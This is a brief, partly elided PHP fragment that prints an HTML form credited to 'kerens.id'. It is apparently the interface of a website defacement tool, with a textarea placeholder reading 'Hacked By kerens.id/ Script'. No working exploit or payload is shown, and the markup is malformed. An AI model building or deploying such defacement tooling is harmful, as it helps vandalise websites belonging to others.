...
echo $coba;
	...
	echo '<html>
	<head>
		<title>Created By kerens.id</title>
	</head>

	<body>
			<center>
				<font face="Orbitron"<font size="7">Coded By Kerens.id</font>
						<table>
							...
							<tr><td><textarea rows="10" cols="19px" name="script" placeholder="Hacked By kerens.id/ Script"></textarea></td></tr>

							<br><tr><td><input type="submit" value="Submit"></td></tr>
							</form>
						</table>
						<font color="red">*contact:fb.com/xmxkerens</font>
			</center>
